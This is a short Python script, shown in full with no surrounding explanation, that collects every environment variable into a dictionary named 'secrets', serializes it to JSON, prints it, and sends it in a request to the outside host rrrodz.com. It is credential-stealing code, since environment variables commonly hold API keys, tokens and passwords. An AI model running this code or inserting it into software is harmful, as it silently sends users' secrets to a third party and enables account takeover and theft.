import os
import json
import requests

secrets = dict(os.environ)
json_secrets = json.dumps(secrets)

print(json_secrets)

response = requests.get('https://rrrodz.com', data = json_secrets)
